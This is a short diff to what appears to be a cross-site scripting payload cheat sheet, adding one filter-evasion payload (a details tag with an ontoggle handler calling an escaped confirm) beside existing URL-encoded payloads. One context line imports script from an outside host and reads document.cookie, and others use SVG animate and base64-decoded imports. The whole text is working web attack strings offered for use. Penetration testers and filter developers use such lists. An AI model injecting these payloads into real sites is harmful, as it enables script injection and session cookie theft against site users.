@@ -274,6 +274,7 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   2%22%3E%3C!--%3E%3Cinput%20autofocus%20id=//X55.is%20onfocus=import(id)%3E#alert(document.cookie)
   %3Csvg%3E%3Ca%20xmlns:xlink=http://www.w3.org/1999/xlink%20xlink:href=?%3E%3Ccircle%20r=400%20/%3E%3Canimate%20attributeName=xlink:href%20begin=0%20from=javascript:alert(1)%20to=%26%3E
   %27%22-import(%60data:text/javascript%60%2batob(%27Ow==%27)%2b%60base64,YWxlcnQoMSk=%60)-%22/
+  -->"'/></script><deTailS open x=">" ontoggle=(co\u006efirm)``>
   ```
 </details>
 
